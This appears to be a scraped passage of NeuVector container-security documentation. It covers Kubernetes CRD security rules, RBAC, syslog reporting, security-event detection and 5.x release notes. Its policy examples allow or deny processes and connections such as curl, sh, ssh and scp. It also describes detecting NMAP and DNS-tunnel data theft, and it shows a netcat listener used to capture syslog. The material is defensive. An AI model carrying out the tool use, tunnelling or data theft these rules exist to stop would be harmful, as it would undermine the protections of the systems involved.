kube-dns.kube-system - key: domain op: = value: kube-system name: nv.kube-dns.kube-system action: allow applications: - DNS name: nv.kube-dns.kube-system-egress-3 ports: any file: [] ingress: [] process: - action: allow name: curl path: &quot;&quot; - action: allow name: node path: /usr/bin/nodejs - action: allow name: pause path: /pause - action: allow name: ps path: /bin/ps - action: allow name: sh path: /bin/dash - action: allow name: whoami path: /usr/bin/whoami target: selector: criteria: - key: service op: = value: node-pod.demo - key: domain op: = value: demo name: nv.node-pod.demo policymode: Protect - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.redis-pod.demo namespace: demo spec: egress: [] file: [] ingress: [] process: - action: allow name: pause path: /pause - action: allow name: redis-server path: /usr/local/bin/redis-server target: selector: criteria: - key: service op: = value: redis-pod.demo - key: domain op: = value: demo name: nv.redis-pod.demo policymode: Monitor - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.kube-dns.kube-system namespace: kube-system spec: egress: null file: null ingress: null process: null target: selector: criteria: - key: service op: = value: kube-dns.kube-system - key: domain op: = value: kube-system name: nv.kube-dns.kube-system policymode: Monitor - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.exploit.demo namespace: demo spec: egress: null file: null ingress: null process: null target: selector: criteria: - key: service op: = value: exploit.demo - key: domain op: = value: demo name: nv.exploit.demo policymode: Monitor kind: List metadata: null   For example:  This is a namespaced CRD, of NvSecurityRulenginx-pod.demo can talk to node-pod.demo over HTTP, and allowed processes are listednode-pod.demo can talk to redis-pod.demo using the Redis protocolThe policymode of the services are set to Monitor modenode-pod.demo is allowed to egress to google.com using SSLGroup names such as nv.node-pod.demo are referenced but not defined in the CRD, so are expected to already exist when deployed. See below for defining Groups.  ","version":"Next 🚧","tagName":"h3"},{"title":"Policy Mode Configuration and Group Definition​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/next/policy/usingcrd#policy-mode-configuration-and-group-definition","content":" Policy mode configuration and Group definition is supported within the CRD configuration yaml file. With policymode configured in the yaml configuration file, importing such file will set the target group to this value for the CRD import.  important The imported target policy mode is not allowed to be modified from the NeuVector console (Policy -&gt; Groups). For example, once the mode is set to Monitor, it can only be changed through CRD modification, not through the console.  note The CRD import behavior ignores the PolicyMode of any 'linked' group, leaving the Policy mode unchanged if the linked group already exists. If the linked group does not exist it will be automatically created and set to the default New Services Mode in Settings -&gt; Configuration.  Policy Mode Configuration Requirements​  Mode only applies to the configured Target groupThe target group configuration must have the format nv.SERVICE_NAME.DOMAIN. Example: nv.xxx.yyyxxx.yyy=SERVICEyyy=DOMAIN Supported values are Discover, Monitor, and ProtectThe target group must contain the key-value pair key: serviceA configured key: domain must match the service domain suffix with the configured service key-value pair  Policy Mode Configuration Yaml file Example   target: policymode: Protect selector: name: nv.xxx.yyy criteria: - key: service #1 of 2 Criteria must exist value: xxx.yyy op: &quot;=&quot; - key: domain #2 of 2 Criteria must exist value: yyy op: &quot;=&quot;   ","version":"Next 🚧","tagName":"h3"},{"title":"CRD Policy Rules Syntax and Semantics​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/next/policy/usingcrd#crd-policy-rules-syntax-and-semantics","content":" Group Name  Avoid using names which start with fed., nv.ip., host:, or workload: which are reserved for federated groups or ip based services.You can use node, external, or containers as a group name. However, this will be the same as the reserved default group names, so a new group will not be created. Any group definition criteria in the CRD will be ignored, but the rules for the group will be processed. The new rules will be shown under the group name.Meets the criteria: ^[a-zA-Z0-9]+[.:a-zA-Z0-9_-]*$Must not begin with fed, workload, or nv.ipIf the name has the format as nv.xxx.yyy, then there must exist a matching service and domain definition, or the import validation will fail. Please refer to the above Policy Mode Configuration for details.If the group name to be imported already exists in the destination system, then the criteria must match between the imported CRD and the one in the destination system. If there are differences, the CRD import will be rejected.  Policy Name  Needs to be unique within a yaml file.Cannot be empty.  Ingress  Is the traffic inbound to the target.  Egress  Is the traffic leaving from the target.  Criteria  Must not be empty unless the name is nodes, external, or containersname - If the name has the service format nv.xxx.yyy, then refer to the above section Policy Mode Configuration section detailskey - The key conforms to the regular expression pattern ^[a-zA-Z0-9]+[.:a-zA-Z0-9_-]*$op (operation) string = &quot;=&quot;string = &quot;!=&quot;string = &quot;contains&quot;string = &quot;prefix&quot;string = &quot;regex&quot;string = &quot;!regex&quot; value - A string without limitationskey - Must not be emptyop - Operator If the operator is equal (=) or not-equal (!=), then its’ value must not be empty.If the operator is equal (=) or not-equal (!=) with a value (such as * or ?), then the value cannot have any regular expresssion format like ^$.Example:Key: serviceOp : =Value: ab?c*e^$ (this is incorrect) Action - Allow or denyApplications (supported values) ActiveMQApacheCassandraConsulCouchbaseCouchDBDHCPDNSEchoElasticSearchetcdGRPCHTTPJettyKafkaMemcachedMongoDBMSSQLMySQLnginxNTPOraclePostgreSQLRabbitMQRadiusRedisRTSPSIPSparkSSHSSLSyslogTFTPVoltDBWordpressZooKeeper Port - The specified format is xxx/yyy. Where xxx=protocol(tcp, udp), and yyy=port_number (0-65535). TCP/123 or TCP/anyUDP/123 or UDP/123ICMP123 = TCP/123 Process - A list of process with action, name, path for each action: allow/deny #This action has precedence over the file access rule. This should be set to allow if the intent is to allow the file access rule to take effect.name: process namepath: process path (optional) File - A list of file access rules; these apply only to the defined target container group app: list of appsbehavior: block_access / monitor_change #This blocks access to the defined filter below. If monitor_change is chosen, then a security-event will be generated from the NeuVector’s webconsole Notifications &gt; Security events page.filter: path/filenamerecursive: true/false  ","version":"Next 🚧","tagName":"h3"},{"title":"RBAC Support with CRDs​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/next/policy/usingcrd#rbac-support-with-crds","content":" Utilizing Kubernetes existing RBAC model, NeuVector extends the CRD (Custom Resource Definition) to support RBAC by utilizing Kubernetes’s Rolebinding in association with the configured Namespace in the NeuVector configured CRD rules when using the NvSecurityRule resource-type. This configured Namespace is then used to enforce the configured Target, which must reside in this namespace configured in the NeuVector security policy. When rolebinding a defined clusterrole, this can be used to bind to a Kubernetes User or Group. The two clusterrole resources types that NeuVector supports are NvSecurityRule and NvClusterSecurityRule.  Rolebinding &amp; Clusterolebinding with 2 Users in different Namespaces to a Clusterrole (NvSecurityRules &amp; NvClusterSecurityRules resources)  The following illustrates a scenario creating one Clusterrole containing both resources (NvSecurityRules and NvClusterSecurityRules) to be bound to two different users.  One user (user1) belongs to Namespace (ns1), while the other user (user2) belongs to Namespace (ns2). User1 will Rolebind to this created Clusterrole (nvsecnvclustrole), while User2 is Clusterrolebind to this same Clusterrole (nvsecnvclustrole).  The key takeaway here is to illustrate that using Rolebinding, this will have Namespace-Level-Scope, whereas using Clusterrolebinding will have Cluster-Level-Scope. User1 will Rolebind (Namespace-Level-Scope), and User2 will be Clusterrolebind (Cluster-Level-Scope). This matters most during RBAC enforcement based on the scope-level that bounds the created users access.  Example using 2 different types of defined yaml files, and the effect of using each user  Create a Clusterrole containing both NvSecurityRules and NvClusterSecurityRules resources. Note: Notice that this clusterrole has 2 resources configured, nvsecurityrules and nvclustersecurityrules. Example (nvsecnvclustroles.yaml):  apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: nvsecnvclustrole rules: - apiGroups: - neuvector.com resources: - nvsecurityrules - nvclustersecurityrules verbs: - list - delete - create - get - update - apiGroups: - apiextensions.k8s.io resources: - customresourcedefinitions verbs: - get - list   Create 2 test yaml-files. One for the NvSecurityRules, and the other for the NvClusterSecurityRules resource. Sample NvSecurityRules nvsecurity.yaml file:  apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ns1crd namespace: ns1 spec: target: selector: name: nv.nginx-pod.ns1 criteria: - key: service value: nginx-pod.ns1 op: &quot;=&quot; - key: domain value: ns1 op: &quot;=&quot; ingress: - selector: name: ingress criteria: - key: domain value: demo op: &quot;=&quot; ports: &quot;tcp/65535&quot; applications: - SSL action: allow name: ingress   Sample NvClusterSecurityRules nvclustersecurity.yaml file:  apiVersion: neuvector.com/v1 kind: NvClusterSecurityRule metadata: name: rbacnvclustmatchnamespacengtargserving namespace: nvclusterspace spec: target: policymode: Protect selector: name: nv.nginx-pod.eng criteria: - key: service value: nginx-pod.eng op: &quot;=&quot; - key: domain value: eng op: &quot;=&quot; ingress: - selector: name: ingress criteria: - key: service value: nginx-pod.demo op: &quot;=&quot; ports: &quot;tcp/65535&quot; applications: - SSL action: allow name: ingress   Switching the user-context to user1 (belongs to the ns1 Namespace) has a Rolebind to the NvSecurityRules resource, who is Namespace bound to the Namespace ns1. Therefore, importing test yaml file (kubectl create –f nvsecurity.yaml should be allowed since this yaml file configuration has the NvSecurityRules resource and the Namespace that this user is bound to.  If there is an attempt to import the test yaml file (nvclustersecurity.yaml ) however, this will be denied since the import CRD yaml file is defined with the resource NvClusterSecurityRules that has a Cluster-Scope, but user1 was Rolebind with a Namespace-Scope. Namespace-scope has a lower privilege than Cluster-Scope. Therefore, Kubernetes RBAC will deny such a request.  Example Error Message:  Error from server (Forbidden): error when creating &quot;rbacnvclustnamespacengtargnvclustingress.yamltmp&quot;: nvclustersecurityrules.neuvector.com is forbidden: User &quot;user1&quot; cannot create resource &quot;nvclustersecurityrules&quot; in API group &quot;neuvector.com&quot; at the cluster scope   Next, we can switch the user-context to user2 with a broader scope privilege, cluster-level-scope. This user2 has a Clusterrolebinding that is not Namespace bound, but has a cluster-level-scope, and associates with the NvClusterSecurityRules resource.  Therefore, using user2 to import either yaml file (nvsecurity.yaml or nvclustersecurity.yaml) will be allowed, since this user’s Clusterrolebinding is not restricted to either resource NvSecurityRules (Namespace-Scope) or NvClusterSecurityRules (Cluster-Scope).  ","version":"Next 🚧","tagName":"h3"},{"title":"Expressing Network Rules (Ingress, Egress objects) in CRDs​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/next/policy/usingcrd#expressing-network-rules-ingress-egress-objects-in-crds","content":" Network rules expressed in CRDs have an Ingress and/or Egress object, which define the allowed incoming and outgoing connections (protocols, ports etc) to/from the workload (Group). Each network rule in NeuVector must have a unique name in a CRD. Note that in the console, network rules only have a unique ID number.  If the 'To' (destination) of the rule is a learned, discovered group, upon export NeuVector prepends the 'nv.' identifier to the name. For example &quot;nv.redis-master.demo-ingress-0&quot;. For both discovered and custom groups, NeuVector also appends a unique name identifier, such as '-ingress-0' in the rule name 'nv.redis-master.demo-ingress-0. For CRD rule names, the 'nv.' identifier is NOT required, and is added to exported rules for clarity. For example:   ingress: - action: allow applications: - Redis name: nv.redis-master.demo-ingress-0   Custom, user created groups are not allowed to have the 'nv.' prefix. Only discovered/learned groups with the domain and service objects should have the prefix. For example:   - action: allow applications: - HTTP name: nv.node-pod.demo-egress-1 ports: any priority: 0 selector: comment: &quot;&quot; criteria: - key: service op: = value: node-pod.demo - key: domain op: = value: demo name: nv.node-pod.demo   ","version":"Next 🚧","tagName":"h3"},{"title":"Customized Configurations for Deployed Applications​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/next/policy/usingcrd#customized-configurations-for-deployed-applications","content":" With the use of a customized CRD yaml file, this enables you to customize network security rules, file access rules, and process security rules, all bundled into a single configuration file. There are multiple benefits to allow these customizations.  First, this allows the same rules to be applied on multiple Kubernetes environments, allowing synchronization among clusters.Second, this allows preemptive rules deployment prior to the applications coming online, which provides a proactive and effective security rules deployment workflow.Third, this allows the policymode to change from an evaluation one (such as Discover or Monitor), to one that protects the final staging environment.  These CRD rules within a yaml file can be imported into the NeuVector security platform through the use of Kubernetes CLI commands such as 'kubectl create –f crd.yaml'. This empowers the security team to tailor the security rules to be applied upon various containers residing in the Kubernetes environment.  For example, a particular yaml file can be configured to enable the policymode to Discover or Monitor a particular container named nv.alpine.ns1 in a staging cluster environment. Moreover, you can limit ssh access for a configured target container nv.alpine.ns1. to another container nv.redhat.ns2.  Once all the necessary tests and evaluations of such security rules are deemed correct, then you can migrate this to a production cluster environment simultaneous to the application deployments by using the NeuVector policy migration feature, which will be discussed later in this section.  Examples of CRD configurations that perform these functions  The following is a sample snippet of such configurations  apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ns1global namespace: ns1 #The target's native namespace spec: target: selector: name: nv.alpine.ns1 criteria: - key: service value: alpine.ns1 #The source target's running container op: &quot;=&quot; - key: domain value: ns1 op: &quot;=&quot; egress: - selector: name: egress criteria: - key: service value: nv.redhat.ns2 #The destination's running container op: &quot;=&quot; ports: tcp/22 #Denies ssh to the destination container nv.redhat.ns2 applications: - SSH action: deny name: egress file: #Applies only to the defined target container group - app: - chmod #The application chmod is the only application allowed to access, while all other apps are denied. behavior: block_access #Supported values are block_access and monitor_change. This blocks access to the defined filter below. filter: /tmp/passwd.txt recursive: false process: - action: allow #This action has precedence over the file access rule. This should be allowed if the intent is to allow the file access rule to take effect. name: chmod # This configured should match the application defined under the file section. path: /bin/chmod   The above snippet is configured to enforce ssh access from the target group container nv.alpine.ns1 to the egress group nv.redhat.ns2. In addition, the enforcement of file access and the process rules are defined and applied to the configured target container nv.alpine.ns1. With this bundled configuration, we have allowed the defined network, file, and process security rules to act upon the configured target group.  ","version":"Next 🚧","tagName":"h3"},{"title":"Policy Groups and Rules Migration Support​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/next/policy/usingcrd#policy-groups-and-rules-migration-support","content":" NeuVector supports the exporting of certain NeuVector group types from a Kubernetes cluster in a yaml file and importing into another Kubernetes cluster by utilizing native kubectl commands.  Migration Use Cases  Export tested CRD groups and security rules that are deemed “production ready” from a staging k8s cluster environment to a production k8s cluster environment.Export learned security rules to be migrated from a staging k8s environment to a production k8s environment.Allow the modification of the policymode of a configured Target group, for instance, such as Discover or Monitor mode in a staging environment, to Protect mode in a production environment.  Supported Export Conditions  Target, Ingress, Egress, Self-learned  Example of groups export  Exported groups with a configured attribute as domain=xx are exported with the Resource-Type NvsecurityRule along with the namespace.    Example of an exported group yaml file with the NvsecurityRule resource type   kind: NvSecurityRule metadata: name: nv.nginx-pod.neuvector namespace: neuvector spec: egress: [] file: [] ingress: [] process: [] target: selector: criteria: - key: service op: = value: nginx-pod.neuvector - key: domain op: = value: neuvector name: nv.nginx-pod.neuvector policymode: Discover   Exported groups without the defined criteria as domain=xx (Namespace) are exported with a Resource-Type NvClusterSecurityRule and a Namespace as default. Examples of Exported groups without a Namespace are external, container, etc.  Example of an exported group yaml file with the NvClusterSecurityRule resource type   kind: NvClusterSecurityRule metadata: name: egress namespace: default spec: egress: [] file: #File path profile applicable to the Target group only, and only applies to self-learned and user create groups - app: - vi - cat behavior: block_access filter: /etc/mysecret #Only vi and cat can access this file with “block_access”. recursive: false ingress: - selector: criteria: - key: service op: = value: nginx-pod.neuvector - key: domain op: = value: neuvector name: nv.nginx-pod.neuvector #Group Name action: allow applications: - Apache - ElasticSearch name: egress-ingress-0 #Policy Name ports: tcp/9400 process: #Process profile applicable to the Target group only, and only applies to self-learned and user create groups. - action: deny #Possible values are deny and allow name: ls path: /bin/ls #This example shows it denies the ls command for this target. target: selector: criteria: - key: service op: = value: nginx-pod.demo name: egress #Group Name policymode: null - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ingress namespace: demo spec:   note The CRD import behavior ignores the PolicyMode of any 'linked' group, leaving the Policy mode unchanged if the linked group already exists. If the linked group does not exist it will be automatically created and set to the default New Services Mode in Settings -&gt; Configuration.  Unsupported Export Group-Types  FederatedIP-Based (unsupported for learned service IP only, custom user created IP groups are supported)  Import Scenarios  The import will create new groups in the destination system if the groups do not yet exist in the destination environment, and the currently used Kubernetes user-context has the necessary permissions to access the namespaces configured in the CRD-yaml file to be imported.If the imported group exists in the destination system with different criteria or values, the import will be rejected.If the imported group exists in the destination system with identical configurations, we will reuse the existing group with different type.  ","version":"Next 🚧","tagName":"h3"},{"title":"CRD Samples for Global Rules​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/next/policy/usingcrd#crd-samples-for-global-rules","content":" The sample CRD below has two parts:  The first part is a NvClusterSecurityRule for the group named containers: The target for this NvClusterSecurityRule is all containers. It has an ingress policy that does not allow any external connections (outside your cluster) to ssh into your containers. It also denies all containers from using the ssh process. This defined global behavior applies to all containers. The second part is a NvSecurityRule for alpine services: The target is a service called nv.alpine.default in the 'default' namespace. Because it belongs to the all containers, it will inherit the above network policy and process rule. It also adds rules that don't not allow connections of HTTP traffic through port 80 to an external network. Also it not allow the running of the scp process.  Note that for service nv.alpine.default (defined as nv.xxx.yyy where xxx is the service name like alpine, yyy is the namespace like default) we can define policy mode that it is set to. Here it is defined as Protect mode (blocking all abnormal activity).  Overall since nv.alpine.defult is in protect mode, it will deny containers from running ssh and scp, and also will deny ssh connections from external or http to external.  If you change the nv.alpine.defult policymode to monitor, then NeuVector will just log it when scp/ssh is invoked, or there are ssh connections from external or http to external.  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvClusterSecurityRule metadata: name: containers namespace: default spec: egress: [] file: [] ingress: - selector: criteria: [] name: external action: deny applications: - SSH name: containers-ingress-0 ports: tcp/22 process: - action: deny name: ssh path: /bin/ssh target: selector: criteria: - key: container op: = value: '*' name: containers policymode: null - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.alpine.default namespace: default spec: egress: - selector: criteria: [] name: external action: deny applications: - HTTP name: external-egress-0 ports: tcp/80 file: [] ingress: [] process: - action: deny name: scp path: /bin/scp target: selector: criteria: - key: service op: = value: alpine.default - key: domain op: = value: default name: nv.alpine.default policymode: Protect kind: List metadata: null   To allow, or whitelist a process such as a monitoring process to run, just add a process rule with action: allow for the process name, and add the path. The path must be specified for allow rules but is optional for deny rules.  ","version":"Next 🚧","tagName":"h3"},{"title":"Updating CRD Rules and Adding to Existing Groups​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/next/policy/usingcrd#updating-crd-rules-and-adding-to-existing-groups","content":" Updating the CRD generated rules in NeuVector is as simple as updating the appropriate yaml file and applying the update:  kubectl apply -f &lt;crdrule.yaml&gt;   Dynamic criteria support for NvClusterSecurityRule​  Multiple CRDs which change the criteria for existing custom group(s) are supported. This feature also allows the user to apply multiple CRDs at once, where the NeuVector behavior is to accept and queue the CRD so the immediate response to the user is always success. During processing, any errors are reported into the console Notifications -&gt; Events. ","version":"Next 🚧","tagName":"h3"},{"title":"Reporting & Notifications","type":0,"sectionRef":"#","url":"/next/reporting/reporting","content":"","keywords":"","version":"Next 🚧"},{"title":"Reporting​","type":1,"pageTitle":"Reporting & Notifications","url":"/next/reporting/reporting#reporting","content":" Reports can be viewed and downloaded from several menus in the NeuVector console. The Dashboard displays a security summary which can be downloaded as a pdf. The pdf download can be filtered for a namespace if desired.    Vulnerability scanning and CIS benchmark results for registries, containers, nodes and platforms can also be downloaded as CSV files from their respective menus in the Assets menu sections.  The Security Risks menu provides advanced correlation, filtering and reporting for vulnerabilities and compliance checks. Filtered views can be exported in CSV or PDF formats.    Compliance reports for PCI, HIPAA, GDPR and other regulations can be filtered, viewed and exported by selecting the regulation in the advanced filter popup in Security Risks -&gt; Compliance.    Event Reporting​  All events such as security, admin, admission, scanning, and risk are logged by NeuVector and can be also viewed in the Console in the Notifications menu. See below for details.  Event Limits  All events are stored in memory for display in the Dashboard and Notifications screens. It is expected that events are sent via SYSLOG, webhook or other means to be stored and managed by a SIEM system. There is currently a 4K limit on each event type below:  Risk Reports (scanning, found in Notifications -&gt; Risk Reports)General Events (administration, found in the Notifications -&gt; Events)Violations (network violations, found in Notifications -&gt; Security Events)Threats (network attacks and connection issues, found in Notifications -&gt; Security Events)Incidents (process and file violations, found in Notifications -&gt; Security Events)  This is why once the limit is reached, only the most recent 4K events of that type are shown. This affects the Notifications lists are well as the displays in the Dashboard.  ","version":"Next 🚧","tagName":"h3"},{"title":"SIEM and SYSLOG​","type":1,"pageTitle":"Reporting & Notifications","url":"/next/reporting/reporting#siem-and-syslog","content":" You can configure the SYSLOG server and webhook notifications in the NeuVector console in the Settings -&gt; Configuration menu. Choose the logging level, TCP or UDP, and format if json is desired. CVE data can be sent individually for each CVE and/or include layered scan results. You can also choose to send events to the controller's pod log instead of or in addition to syslog. Note that events are only sent to the lead controller's pod log.  You can then use your favorite reporting tools to monitor NeuVector events.  In addition, you can configure your syslog server through the CLI as follows:  &gt; set system syslog_server &lt;ip&gt;[:port]   The REST API can also be used for configuration.  Sample SYSLOG Output​  Network Violation  2020-01-24T21:39:34Z neuvector-controller-pod-575f94dccf-rccmt /usr/local/bin/controller 12 neuvector - notification=violation,level=Warning,reported_timestamp=1579901965,reported_at=2020-01-24T21:39:25Z,cluster_name=cluster.local,client_id=edf1c28d3411a9686e6e0374a9325b6a3626619938d3cf435a9d90075a1ef653,client_name=k8s_POD_node-pod-7c57bdbf5d-dxkn4_default_cdd9cf23-488d-439c-9408-ed98f838c67b_0,client_domain=default,client_image=k8s.gcr.io/pause:3.1,client_service=node-pod.default,server_id=external,server_name=external,server_port=80,ip_proto=6,applications=[HTTP],servers=[],sessions=1,policy_action=violate,policy_id=0,client_ip=192.168.35.69,server_ip=172.217.5.110   Process Violation  2020-01-24T21:39:29Z neuvector-controller-pod-575f94dccf-rccmt /usr/local/bin/controller 12 neuvector - notification=incident,name=Process.Profile.Violation,level=Warning,reported_timestamp=1579901965,reported_at=2020-01-24T21:39:25Z,cluster_name=cluster.local,host_id=k43:HF45:AJC6:5RYO:O5OA:KACD:KRT2:M3O6:P3VQ:IC4I:FSRD:P3HJ:ETLS,host_name=k43,enforcer_id=90822bad25eea14180c0942bf30197528bdab8c8237f307cc3059e6bbdb91f7a,enforcer_name=k8s_neuvector-enforcer-pod_neuvector-enforcer-pod-cg8jp_neuvector_d4ef187e-041c-4bc2-9cdc-c563a3feac6c_0,workload_id=d1be6d14f1f2782029d0944040ea8c0ba581991de99df86041205e15abc80209,workload_name=k8s_node-pod_node-pod-7c57bdbf5d-dxkn4_default_cdd9cf23-488d-439c-9408-ed98f838c67b_0,workload_domain=default,workload_image=nvbeta/node:latest,workload_service=node-pod.default,proc_name=curl,proc_path=/usr/bin/curl,proc_cmd=curl google.com,proc_effective_uid=1000,proc_effective_user=neuvector,client_ip=,server_ip=,client_port=0,server_port=0,server_conn_port=0,ether_type=0,ip_proto=0,conn_ingress=false,proc_parent_name=docker-runc,proc_parent_path=/usr/bin/docker-runc,action=violate,group=nv.node-pod.default,aggregation_from=1579901965,count=1,message=Process profile violation   Admission Control  2020-01-24T21:48:31Z neuvector-controller-pod-575f94dccf-rccmt /usr/local/bin/controller 12 neuvector - notification=audit,name=Admission.Control.Violation,level=Warning,reported_timestamp=1579902506,reported_at=2020-01-24T21:48:26Z,cluster_name=cluster.local,host_id=,host_name=,enforcer_id=,enforcer_name=,workload_domain=default,workload_image=nvbeta/swarm_nginx,base_os=,high_vul_cnt=0,medium_vul_cnt=0,cvedb_version=,message=Creation of Kubernetes ReplicaSet resource (nginx-pod-695cd4b87b) violates Admission Control deny rule id 1000 but is allowed in monitor mode [Notice: the requested image(s) are not scanned: nvbeta/swarm_nginx],user=kubernetes-admin,error=,aggregation_from=1579902506,count=1,platform=,platform_version=   To capture SYSLOG output:  nc -l -p 8514 -o syslog-dump.hex | tee syslog-messages.txt   Captures messages on screen, logs them to file and logs a hexdump.  Integration with Splunk​  You can integrate with Splunk using SYSLOG to capture container security events and report in Splunk.  ","version":"Next 🚧","tagName":"h3"},{"title":"Notifications and Logs​","type":1,"pageTitle":"Reporting & Notifications","url":"/next/reporting/reporting#notifications-and-logs","content":" In the NeuVector Console in the Notifications menu you can find notifications for Security Events, Risk (Scanning &amp; Compliance) Events, and general system events.  Notifications can be downloaded as CSV or PDF from the Notifications menus. In addition, packet captures can be downloaded for network attacks, and vulnerability results can be downloaded from the Notifications -&gt; Risk reports menu for each scan result.  You can also display the logs using the CLI or REST API.  Security Events​  Violations are connections that violate the whitelist Rules or match a blacklist Rule. Network violations are captured and source IPs can be investigated further. Whitelist network violation events show up as &quot;Implicit Deny Rule is Violated&quot; to indicate the network connection did not match any whitelist rule.    In this view, you can review network, process, and file events and easily add a whitelist rule for false positives by clicking the Review Rule button. The Advanced Filter enables you to select the type of event to display.    NeuVector also continuously monitors all containers for know attacks such as DNS, DDoS, HTTP-smuggling, tunneling etc. When an attack is detected it is logged here and blocked (if container/service is set to protect), and the packet is automatically captured. You can view the packet details, for example:    Add New Rules for Security Events  You can easily add rules (Security Policy) to allow or deny the detected event by selecting the Review Rule button and deploying a new rule.    This is useful if false positives occur or a network/process behavior should have been discovered but did not occur during the Discover mode.  Advanced Filters  Create an advanced filter for viewing or exporting events by selecting each general type or entering keywords.  Network. Network events such as violations (implicit deny rules), threats.Process. Process whitelist violations or suspicious processes detected such as NMAP, SSH etc.Package. A package has been updated or installed in the container therefore this generated a security event.Tunnel. A tunnel violation has been detected. Tunneling, typically dns tunneling is used to steal data. This detection is done by seeing a tunnel process start and correlating it with a network activity with dns protocol. See sample event below. Description of iodine tunnel https://github.com/yarrick/iodineFile. File access violation. Either a monitored sensitive file/directory has been accessed (see list of default monitoring, or a custom file monitor rule has been triggered. https://docs.neuvector.com/policy/filerulesPrivilege. A privilege escalation has been detected in container or host. Privilege escalations can be done in many ways and are not 100% detectable so this is a difficult condition to test.  Risk Reports​  This section contains events for vulnerability scans (image, registry, run-time, container, host, platform), compliance scans (CIS benchmarks, custom scripts), and admission control events (allowed, denied).  ","version":"Next 🚧","tagName":"h3"},{"title":"Other Integrations​","type":1,"pageTitle":"Reporting & Notifications","url":"/next/reporting/reporting#other-integrations","content":" NeuVector has published a Prometheus exporter with Grafana dashboard on the NeuVector github account https://github.com/neuvector/prometheus-exporter which can be customized for each installation. In addition, sample integrations with Fluentd are also available upon request.  Webhook alerts can be sent by configuring the web hook endpoint in Settings -&gt; Configuration. Then create the appropriate response rule(s) in the Policy -&gt; Response rules menu to select the type of event and the webhook as the action. ","version":"Next 🚧","tagName":"h3"},{"title":"5.x Release Notes","type":0,"sectionRef":"#","url":"/next/releasenotes/5x","content":"","keywords":"","version":"Next 🚧"},{"title":"Release Notes for 5.x​","type":1,"pageTitle":"5.x Release Notes","url":"/next/releasenotes/5x#release-notes-for-5x","content":" note To receive email notifications of new releases, please subscribe to this SUSE mailing list: https://lists.suse.com/mailman/listinfo/neuvector-updates  5.3.3 June 2024​  Enhancements​  Allow users to block the usage of specific storage classes from the Admission Controls page.The LDAP Authentication has separated fields for baseDN and groupDN configuration.The Egress and Ingress chart has a new vulnerability column which contains the High and Medium vulnerability count for each service.  Bug Fixes​  Fixed bug related to regex when using a comma (,) in a multi-entry Admission Control user criteria.Fixed bug where the CVE scan of jar packages would not show all packages affected by a same CVE. Now all occurences are reported.  Other​  Allow users to set resources for updater-cron-job when installing NeuVector with the Helm chart.Prometheus exporter container versioning reviewed and dissociated to the controller versioning.(Scanner) Detect the R package/module in Ubuntu and Red Hat Enterprise Linux.(Scanner) Added support for PHP Composer scan.  5.2.4-s3 April 2024​  Remediates following CVEs:  CVE\tApplies to\tImpact CVE-2021-40633\tgiflib\t🔴 High CVE-2023-48161\tgiflib\t🔴 High CVE-2024-28757\texpat\t🔴 High CVE-2023-39742\tgiflib\t🟠 Medium CVE-2023-45288\tgo:golang.org/x/net\t🟠 Medium CVE-2024-25629\tc-ares\t🟠 Medium CVE-2024-3651\tpython:idna\t🟠 Medium CVE-2024-2511\topenssl\t🟡 Low  5.3.2 April 2024​  Bug Fixes​  After upgrading to v5.3.1 from a previous NeuVector release, pre-existing NvClusterSecurityRule custom resources may be deleted inadvertently. NOTE: The 5.3.1 version has been removed from docker hub in order to prevent the upgrade issue.  5.3.1 April 2024​  important The 5.3.1 version has been removed from docker hub in order to prevent the upgrade issue fixed in 5.3.2. Please use the 5.3.2 release.  Enhancements​  Allow users to define ‘accepted’ vulnerabilities when using Github actions so they don’t affect workflows.Add Severity, Score level and Feed Rating filters to Assets &gt; Registry &gt; Image Vulnerabilities view.Allow when configuring a registry if it should use the defined proxy for the registry image scans.  Bug Fixes​  Security Risks &gt; Vulnerabilities &gt; Advanced Filter doesn't filter 'CVE without Fix'Unexpected violation from container to hostmode containerAccept OCI image format when switching to docker api 1.24Registry Scan should not scan non-image artifacts / not log an errorAllow for rootless key pair image signature verification without internet or sigstore dependence.Security Events not getting permitted by network rules in a specific node (related to &quot;Container Task chan full&quot; error messages)Container is unable to add to workload successfully (frequent occurences). Resulting from deadlock from channel messages.  Other​  Update the scanner plugins for Jenkins, GitHub action, and Bamboo.(Scanner) Accept OCI image format when switching to docker api 1.24.(Scanner) Registry Scan should not scan non-image artifacts / not log an error.(Scanner) Add support for php composer scan.  NeuVector UI Extension v. 1.0 for Rancher March 2024​  After installation of NeuVector, enabling/installing the NeuVector UI Extension from Rancher will display a Dashboard for the cluster, including links to SSO to the full NeuVector cluster. NOTE: The extension may display as Third Party, which will be fixed in a future release. Also, after installation, Rancher 2.7.x users may see two NeuVector UI Ext icons in the list (bug). One icon will say Uninstall (meaning it is installed), and the other should say Install. This can be left as is, ie, don't Install again if the extension is already installed.  5.2.4-s2 February 2024​  Remediates following CVEs:High cve: CVE-2023-52425 in expat, CVE-2024-20952 and CVE-2024-20918 in openjdk11Med cve: CVE-2023-52426 in expat, CVE-2024-20926, CVE-2024-20921, CVE-2024-20945 and CVE-2024-20919 in openjdk11, CVE-2024-0727 and CVE-2023-6237 in openssl  5.3.0 February 2024​  #####Enhancements  Show external destination URLs (FQDN) in Dashboard (egress), PDF and CSV reports, as we well as in Network Activity screen and Security Events (violations) listsIn Discover mode, learn egresses to external FQDN address groups automatically. A new external FQDN custom group will be created unless the external connection matches an existing rule.Enable ICMP learning (Discover mode) and blocking (Protect mode) through new Controller environment variable CTRL_EN_ICMP_POLICY = 1Export CRDs into Github to support gitops to a default repo using console or REST API.Support SAML SSO single logout with ADFS iDPAdd support for ARM64 platform. Pulling 